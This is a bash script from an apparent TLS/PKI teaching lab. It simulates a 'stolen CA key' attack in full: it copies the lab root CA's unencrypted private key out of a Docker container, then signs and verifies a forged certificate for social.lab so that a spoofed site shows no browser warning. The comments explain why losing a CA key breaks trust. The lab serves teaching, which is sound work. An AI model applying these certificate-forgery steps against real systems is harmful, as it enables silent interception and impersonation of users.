#!/bin/bash
# OPTION 2 - the "stolen CA key" attack. Run from the project root ON THE HOST.
#
# This is the catastrophe case. It assumes the attacker has already broken into
# a server and walked off with the lab CA's ROOT PRIVATE KEY (in this lab the
# key lives in the `ca` instance and has no passphrase, so a copy is enough).
# With that key the attacker signs its OWN certificate for social.lab - a
# certificate that really does chain to the lab Root CA every browser trusts.
#
# The result: with this forged certificate, the DNS/hosts spoof from option 1
# produces NO browser warning. The padlock is green, the chain verifies, and
# the victim has no visual cue at all. That is why a CA's private key is the
# crown jewel: lose it and the whole trust model collapses until the root is
# revoked and every client stops trusting it.
#
# It writes the forged cert to attacker/server-forged/ and does NOT touch the
# self-signed cert from option 1 (attacker/server/). Switch between them with
# ./attacker/mode.sh.
set -e
cd "$(dirname "$0")/.."

CA_SRC="ca"                                   # container the CA key is stolen from
CA_KEY="/app/demoCA/private/cakey.pem"        # ...and where it sits there
CA_CERT="/app/demoCA/cacert.pem"
DOMAIN="social.lab"
OUT="attacker/server-forged"
STOLEN="attacker/stolen-ca"

mkdir -p "$OUT" "$STOLEN"
chmod 700 "$OUT" "$STOLEN"

echo "[1/4] Exfiltrating the CA root key + cert from the '$CA_SRC' server ..."
docker compose exec -T "$CA_SRC" cat "$CA_KEY"  > "$STOLEN/cakey.pem"
docker compose exec -T "$CA_SRC" cat "$CA_CERT" > "$STOLEN/cacert.pem"
chmod 600 "$STOLEN/cakey.pem"
echo "      got $(wc -c < "$STOLEN/cakey.pem") bytes of CA private key (no passphrase)."

echo "[2/4] Making a fresh key + CSR for $DOMAIN ..."
openssl genrsa -out "$OUT/key.pem" 2048 2>/dev/null
openssl req -new -key "$OUT/key.pem" -out "$OUT/social.csr" \
    -subj "/O=Social Lab/CN=$DOMAIN" 2>/dev/null
chmod 600 "$OUT/key.pem"

echo "[3/4] Signing it with the STOLEN CA key (a leaf cert, just like a real one) ..."
cat > "$OUT/ext.cnf" <<EOF
basicConstraints=critical,CA:FALSE
keyUsage=critical,digitalSignature,keyEncipherment
extendedKeyUsage=serverAuth
subjectAltName=DNS:$DOMAIN
EOF
openssl x509 -req -in "$OUT/social.csr" \
    -CA "$STOLEN/cacert.pem" -CAkey "$STOLEN/cakey.pem" -CAcreateserial \
    -days 365 -extfile "$OUT/ext.cnf" -out "$OUT/cert.pem" 2>/dev/null

echo "[4/4] Checking the forged cert chains to the lab Root CA ..."
openssl verify -CAfile "$STOLEN/cacert.pem" "$OUT/cert.pem" | sed 's/^/      /'
openssl x509 -in "$OUT/cert.pem" -noout -subject -issuer | sed 's/^/      /'
echo
echo "Done. The forged certificate is in $OUT/ and is trusted by the lab CA."
echo "Serve it with:  ./attacker/mode.sh trusted"
